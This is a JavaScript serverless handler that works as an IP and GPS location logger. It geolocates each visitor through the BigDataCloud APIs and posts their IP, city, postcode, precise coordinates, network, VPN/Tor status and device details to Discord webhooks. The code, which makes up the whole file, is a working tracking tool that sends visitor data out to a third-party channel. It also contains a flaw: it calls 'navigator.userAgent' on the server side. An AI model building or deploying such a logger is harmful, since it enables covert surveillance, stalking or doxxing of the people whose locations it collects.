// api/log.js - Updated with Discord webhook support

const fetch = require('node-fetch');

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const API_KEY = process.env.BIGDATACLOUD_API_KEY;
    const IP_DISCORD_WEBHOOK = process.env.IP_DISCORD_WEBHOOK;
    const GPS_DISCORD_WEBHOOK = process.env.GPS_DISCORD_WEBHOOK;
    
    if (!API_KEY) {
      return res.status(500).json({ error: 'API key not configured' });
    }
    
    const { gpsCoordinates, userAgent } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.connection.remoteAddress;
    
    console.log(`Processing request from IP: ${clientIP}`);
    
    // Always get IP geolocation
    const [ipGeoData, userAgentData, riskData] = await Promise.all([
      fetch(`https://api-bdc.net/data/ip-geolocation-full?key=${API_KEY}&ip=${clientIP}`).then(r => r.json()),
      fetch(`https://api-bdc.net/data/user-agent-info?key=${API_KEY}&userAgent=${encodeURIComponent(userAgent || navigator.userAgent)}`).then(r => r.json()),
      fetch(`https://api-bdc.net/data/user-risk?key=${API_KEY}`).then(r => r.json())
    ]);
    
    // Prepare IP data for Discord
    const ipEmbed = createIPEmbed(ipGeoData, userAgentData, riskData, clientIP);
    
    // Send IP webhook to Discord
    if (IP_DISCORD_WEBHOOK && !IP_DISCORD_WEBHOOK.includes('YOUR_')) {
      await sendDiscordWebhook(IP_DISCORD_WEBHOOK, {
        embeds: [ipEmbed]
      });
    } else {
      console.log('IP Discord webhook URL not configured');
    }
    
    let gpsResponse = null;
    
    // If GPS coordinates provided
    if (gpsCoordinates && gpsCoordinates.latitude && gpsCoordinates.longitude) {
      const reverseGeoData = await fetch(
        `https://api-bdc.net/data/reverse-geocode-with-timezone?latitude=${gpsCoordinates.latitude}&longitude=${gpsCoordinates.longitude}&key=${API_KEY}`
      ).then(r => r.json());
      
      // Prepare GPS data for Discord
      const gpsEmbed = createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP);
      
      // Send GPS webhook to Discord
      if (GPS_DISCORD_WEBHOOK && !GPS_DISCORD_WEBHOOK.includes('YOUR_')) {
        await sendDiscordWebhook(GPS_DISCORD_WEBHOOK, {
          embeds: [gpsEmbed]
        });
      } else {
        console.log('GPS Discord webhook URL not configured');
      }
      
      gpsResponse = {
        gpsData: prepareGPSWebhookData(reverseGeoData, gpsCoordinates)
      };
    }
    
    // Return response to client
    res.status(200).json({
      success: true,
      message: 'Data processed successfully',
      ipData: prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP),
      gpsData: gpsResponse?.gpsData || null
    });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      error: 'Internal server error',
      message: error.message 
    });
  }
}

// Function to send Discord webhook
async function sendDiscordWebhook(webhookUrl, data) {
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      console.error(`Discord webhook failed: ${response.status} ${response.statusText}`);
      return false;
    }
    
    console.log('Discord webhook sent successfully');
    return true;
  } catch (error) {
    console.error('Discord webhook error:', error);
    return false;
  }
}

// Create Discord embed for IP data
function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
  const location = ipGeoData.location || {};
  const country = ipGeoData.country || {};
  const network = ipGeoData.network || {};
  const hazard = ipGeoData.hazardReport || {};
  const carriers = network.carriers || [];
  
  // Get ASN and Organization from first carrier
  const primaryCarrier = carriers[0] || {};
  
  // Format coordinates
  const coords = location.latitude && location.longitude 
    ? `${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`
    : 'Not available';
  
  // Format security info
  const securityStatus = hazard.isKnownAsVpn ? '🔴 VPN' : 
                        hazard.isKnownAsProxy ? '🟡 Proxy' : 
                        hazard.isKnownAsTorServer ? '🔴 Tor' : 
                        '🟢 Clean';
  
  const riskColor = riskData.risk === 'High' ? 0xFF0000 : 
                   riskData.risk === 'Medium' ? 0xFFA500 : 
                   0x00FF00;
  
  return {
    title: '🌐 IP Geolocation Data',
    description: `Data collected for ${clientIP}`,
    color: riskColor,
    timestamp: new Date().toISOString(),
    fields: [
      {
        name: '📌 Location',
        value: `**Country:** ${country.name || 'N/A'}
**Region:** ${location.principalSubdivision || 'N/A'}
**City:** ${location.city || location.localityName || 'N/A'}
**Coordinates:** ${coords}
**Timezone:** ${location.timeZone?.ianaTimeId || 'N/A'}
**Local Time:** ${location.timeZone?.localTime || 'N/A'}`,
        inline: true
      },
      {
        name: '🔧 Network',
        value: `**IP:** ${ipGeoData.ip || clientIP}
**ASN:** ${primaryCarrier.asn || 'N/A'}
**Organization:** ${primaryCarrier.organisation || 'N/A'}
**Carrier:** ${network.organisation || 'N/A'}
**Confidence:** ${ipGeoData.confidence || 'N/A'}
**Registry:** ${network.registry || 'N/A'}`,
        inline: true
      },
      {
        name: '🛡️ Security',
        value: `**Status:** ${securityStatus}
**Threat Level:** ${ipGeoData.securityThreat || 'Unknown'}
**VPN:** ${hazard.isKnownAsVpn ? '✅ Yes' : '❌ No'}
**Proxy:** ${hazard.isKnownAsProxy ? '✅ Yes' : '❌ No'}
**Tor:** ${hazard.isKnownAsTorServer ? '✅ Yes' : '❌ No'}
**Hosting:** ${hazard.isHostingAsn ? '✅ Yes' : '❌ No'}
**Cellular:** ${hazard.isCellular ? '✅ Yes' : '❌ No'}`,
        inline: true
      },
      {
        name: '👤 User Info',
        value: `**Risk Level:** ${riskData.risk || 'N/A'}
**Device:** ${userAgentData.device || 'N/A'}
**OS:** ${userAgentData.os || 'N/A'}
**User Agent:** ${userAgentData.userAgent?.substring(0, 50)}${userAgentData.userAgent?.length > 50 ? '...' : ''}
**Mobile:** ${userAgentData.isMobile ? '✅ Yes' : '❌ No'}
**Bot:** ${userAgentData.isSpider ? '✅ Yes' : '❌ No'}`,
        inline: false
      }
    ],
    footer: {
      text: 'IP Geolocation Tracker • BigDataCloud API'
    }
  };
}

// Create Discord embed for GPS data
function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP) {
  const timeZone = reverseGeoData.timeZone || {};
  
  return {
    title: '📍 GPS Location Data',
    description: `Precise location obtained from ${clientIP}`,
    color: 0x00FF00, // Green color
    timestamp: new Date().toISOString(),
    fields: [
      {
        name: '🎯 Precise Location',
        value: `**Coordinates:** ${gpsCoordinates.latitude.toFixed(6)}, ${gpsCoordinates.longitude.toFixed(6)}
**Accuracy:** Direct GPS`,
        inline: false
      },
      {
        name: '🏙️ Address Details',
        value: `**Country:** ${reverseGeoData.countryName || 'N/A'}
**Region:** ${reverseGeoData.principalSubdivision || 'N/A'}
**City:** ${reverseGeoData.city || 'N/A'}
**Locality:** ${reverseGeoData.locality || 'N/A'}
**Postcode:** ${reverseGeoData.postcode || 'N/A'}
**Continent:** ${reverseGeoData.continent || 'N/A'}`,
        inline: true
      },
      {
        name: '🕒 Time Information',
        value: `**Timezone:** ${timeZone.ianaTimeId || 'N/A'}
**Local Time:** ${timeZone.localTime || 'N/A'}
**UTC Offset:** ${timeZone.utcOffset || 'N/A'}
**DST:** ${timeZone.isDaylightSavingTime ? '✅ Active' : '❌ Not active'}`,
        inline: true
      },
      {
        name: '📊 Additional Info',
        value: `**Source:** Browser GPS Permission
**Plus Code:** ${reverseGeoData.plusCode || 'N/A'}
**Continent Code:** ${reverseGeoData.continentCode || 'N/A'}
**Country Code:** ${reverseGeoData.countryCode || 'N/A'}`,
        inline: false
      }
    ],
    footer: {
      text: 'GPS Reverse Geocode • BigDataCloud API'
    }
  };
}

// Original data preparation functions (kept for compatibility)
function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP) {
  const location = ipGeoData.location || {};
  const country = ipGeoData.country || {};
  const network = ipGeoData.network || {};
  const hazard = ipGeoData.hazardReport || {};
  const carriers = network.carriers || [];
  const primaryCarrier = carriers[0] || {};
  
  return {
    'IP Address (ip)': ipGeoData.ip || clientIP,
    'Continent (continent)': location.continent || 'N/A',
    'Country (name)': country.name || 'N/A',
    'Region (principalSubdivision)': location.principalSubdivision || 'N/A',
    'City (city)': location.city || location.localityName || 'N/A',
    'Locality (localityName)': location.localityName || 'N/A',
    'Post Code (postcode)': location.postcode || 'N/A',
    'Coordinates (latitude & longitude)': location.latitude && location.longitude 
      ? `${location.latitude}, ${location.longitude}` 
      : 'N/A',
    'Timezone (ianaTimeId)': location.timeZone?.ianaTimeId || 'N/A',
    'Localtime (localTime)': location.timeZone?.localTime || 'N/A',
    'ASN (asn inside carriers)': primaryCarrier.asn || 'N/A',
    'Organization (organisation inside carriers)': primaryCarrier.organisation || 'N/A',
    'Confidence (confidence)': ipGeoData.confidence || 'N/A',
    'Security Threat (securityThreat)': ipGeoData.securityThreat || 'N/A',
    'VPN (isKnownAsVpn)': hazard.isKnownAsVpn ? 'Yes' : 'No',
    'Proxy (isKnownAsProxy)': hazard.isKnownAsProxy ? 'Yes' : 'No',
    'Tor (isKnownAsTorServer)': hazard.isKnownAsTorServer ? 'Yes' : 'No',
    'Hosting ASN (isHostingAsn)': hazard.isHostingAsn ? 'Yes' : 'No',
    'Cellular Network (isCellular)': hazard.isCellular ? 'Yes' : 'No',
    'Risk (risk)': riskData.risk || 'N/A',
    'User Agent (from the browser)': userAgentData.userAgent || 'N/A',
    'Device (device)': userAgentData.device || 'N/A',
    'OS (os)': userAgentData.os || 'N/A',
    'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
    'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
  };
}

function prepareGPSWebhookData(reverseGeoData, gpsCoordinates) {
  const timeZone = reverseGeoData.timeZone || {};
  
  return {
    'Source': 'gps_reverse_geocode',
    'IP Address (ip)': 'GPS-based - Not applicable',
    'Continent (continent)': reverseGeoData.continent || 'N/A',
    'Country (name)': reverseGeoData.countryName || 'N/A',
    'Region (principalSubdivision)': reverseGeoData.principalSubdivision || 'N/A',
    'City (city)': reverseGeoData.city || 'N/A',
    'Locality (locality)': reverseGeoData.locality || 'N/A',
    'Post Code (postcode)': reverseGeoData.postcode || 'N/A',
    'Coordinates (latitude & longitude)': `${reverseGeoData.latitude}, ${reverseGeoData.longitude}`,
    'Timezone (ianaTimeId)': timeZone.ianaTimeId || 'N/A',
    'Localtime (localTime)': timeZone.localTime || 'N/A',
    'ASN (asn inside carriers)': 'GPS-based - Not applicable',
    'Organization (organisation inside carriers)': 'GPS-based - Not applicable',
    'Confidence (confidence)': 'High (GPS)',
    'GPS Accuracy': 'Direct GPS coordinates',
    'GPS Source': 'Browser geolocation API'
  };
          }
